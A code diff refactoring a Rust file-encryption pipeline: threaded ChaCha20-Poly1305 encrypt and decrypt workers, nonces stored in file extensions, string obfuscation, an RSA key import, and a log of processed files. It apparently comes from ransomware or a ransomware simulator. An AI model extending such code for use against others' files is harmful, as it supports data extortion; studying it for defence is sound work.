@@ -1,3 +1,4 @@
+use flume::{Receiver, Sender};
 use hex::{FromHex, encode};
 use log::{debug, error, info, warn};
 use purecrypto::{cipher::ChaCha20Poly1305, rsa::BoxedRsaPublicKey};
@@ -8,11 +9,9 @@ use rand::{
 use std::{
     fs::{self, File, OpenOptions},
     io::{Error, Read, Write},
+    panic,
     path::PathBuf,
-    sync::{
-        Arc, LazyLock, Mutex,
-        mpsc::{Receiver, SyncSender},
-    },
+    sync::{Arc, LazyLock},
     thread, time,
 };
 use zeroize::Zeroizing;
@@ -28,19 +27,15 @@ pub fn generate_nonce() -> [u8; 12] {
 static ANALYSIS_FILENAME: LazyLock<String> = LazyLock::new(|| lc!("analysis.txt"));
 
 pub fn encrypt(
-    receiver: Arc<Mutex<Receiver<Arc<PathBuf>>>>,
-    sender: SyncSender<Arc<PathBuf>>,
+    receiver: Receiver<Arc<PathBuf>>,
+    sender: Sender<Arc<PathBuf>>,
     key: Arc<Zeroizing<[u8; 32]>>,
     aad: Arc<[u8]>,
 ) -> thread::JoinHandle<()> {
     debug!("Starting encryption crypto thread");
     thread::spawn(move || {
         loop {
-            let received = receiver
-                .lock()
-                .unwrap_or_else(std::sync::PoisonError::into_inner)
-                .recv();
-            let file_path = match received {
+            let file_path = match receiver.recv() {
                 Ok(path) => {
                     debug!("Received file path over channel: {path:?}");
                     path
@@ -51,7 +46,7 @@ pub fn encrypt(
                 }
             };
 
-            let result = std::panic::catch_unwind({
+            let result = panic::catch_unwind({
                 let file_path = file_path.clone();
                 let key = Arc::clone(&key);
                 let aad = Arc::clone(&aad);
@@ -131,10 +126,7 @@ pub fn encrypt(
     })
 }
 
-pub fn record(
-    receiver: Arc<Mutex<Receiver<Arc<PathBuf>>>>,
-    path: Arc<PathBuf>,
-) -> thread::JoinHandle<()> {
+pub fn record(receiver: Receiver<Arc<PathBuf>>, path: Arc<PathBuf>) -> thread::JoinHandle<()> {
     thread::spawn(move || {
         let analysis_file_path = path.join(&*ANALYSIS_FILENAME);
         let mut analysis_file = match OpenOptions::new()
@@ -150,11 +142,7 @@ pub fn record(
         };
 
         loop {
-            let received = receiver
-                .lock()
-                .unwrap_or_else(std::sync::PoisonError::into_inner)
-                .recv();
-            let file_path = match received {
+            let file_path = match receiver.recv() {
                 Ok(path) => {
                     debug!("Received file path over channel: {path:?}");
                     path
@@ -175,17 +163,13 @@ pub fn record(
 }
 
 pub fn decrypt(
-    receiver: Arc<Mutex<Receiver<Arc<PathBuf>>>>,
+    receiver: Receiver<Arc<PathBuf>>,
     key: Arc<Zeroizing<[u8; 32]>>,
     aad: Arc<[u8]>,
 ) -> thread::JoinHandle<()> {
     thread::spawn(move || {
         loop {
-            let received = receiver
-                .lock()
-                .unwrap_or_else(std::sync::PoisonError::into_inner)
-                .recv();
-            let file_path = match received {
+            let file_path = match receiver.recv() {
                 Ok(path) => {
                     debug!("Received file path over channel: {path:?}");
                     path
@@ -198,24 +182,23 @@ pub fn decrypt(
 
             info!("Decrypting file: {}", file_path.display());
 
-            let file_name_osstr = if let Some(os_str) = file_path.file_name() {
-                debug!("Successfully got file name from path: {}", os_str.display());
-                os_str
-            } else {
+            let Some(file_name_osstr) = file_path.file_name() else {
                 error!("File path has invalid file name: {file_path:?}");
                 continue;
             };
+            debug!(
+                "Successfully got file name from path: {}",
+                file_name_osstr.display()
+            );
 
-            let file_name = if let Some(name) = file_name_osstr.to_str() {
-                debug!("Successfully converted file name to string: {name}");
-                name
-            } else {
+            let Some(file_name) = file_name_osstr.to_str() else {
                 error!(
                     "File name is not valid UTF-8: {}",
                     file_name_osstr.display()
                 );
                 continue;
             };
+            debug!("Successfully converted file name to string: {file_name}");
 
             let file_extensions: Vec<&str> = file_name.split('.').collect();
             let file_extensions_count = file_extensions.len();
@@ -224,13 +207,11 @@ pub fn decrypt(
                 continue;
             }
 
-            let nonce_str = if let Some(segment) = file_extensions.get(file_extensions_count - 2) {
-                debug!("Successfully got nonce file extension: {segment}");
-                segment
-            } else {
+            let Some(nonce_str) = file_extensions.get(file_extensions_count - 2) else {
                 error!("Cannot get nonce extension: {file_extensions:?}");
                 continue;
             };
+            debug!("Successfully got nonce file extension: {nonce_str}");
 
             let full_nonce_bytes = match <[u8; 12]>::from_hex(nonce_str) {
                 Ok(nonce_bytes) => {
@@ -243,13 +224,11 @@ pub fn decrypt(
                 }
             };
 
-            let parent_dir = if let Some(parent) = file_path.parent() {
-                debug!("Successfully got parent path of file path: {file_path:?}");
-                parent
-            } else {
+            let Some(parent_dir) = file_path.parent() else {
                 error!("File path has invalid parent path: {file_path:?}");
                 continue;
             };
+            debug!("Successfully got parent path of file path: {file_path:?}");
 
             let decrypted_file_name = file_extensions[..file_extensions_count - 2].join(".");
             debug!("Decrypted file name: {decrypted_file_name}");
@@ -285,7 +264,7 @@ fn aead_encrypt_file(
         let aead = ChaCha20Poly1305::new(key);
         let mut source = File::open(source_file_path)?;
         let mut dest = File::create(destination_file_path)?;
-        let mut data = Vec::new();
+        let mut data = Vec::with_capacity(usize::try_from(source.metadata()?.len()).unwrap_or(0));
         source.read_to_end(&mut data)?;
         let tag = aead.encrypt(full_nonce_bytes, aad, &mut data);
         dest.write_all(&data)?;
@@ -309,7 +288,7 @@ fn aead_decrypt_file(
     let aead = ChaCha20Poly1305::new(key);
     let mut source = File::open(source_file_path)?;
     let mut dest = File::create(destination_file_path)?;
-    let mut data = Vec::new();
+    let mut data = Vec::with_capacity(usize::try_from(source.metadata()?.len()).unwrap_or(0));
     source.read_to_end(&mut data)?;
     if data.len() < 16 {
         return Err(Error::other("Encrypted file shorter than Poly1305 tag"));
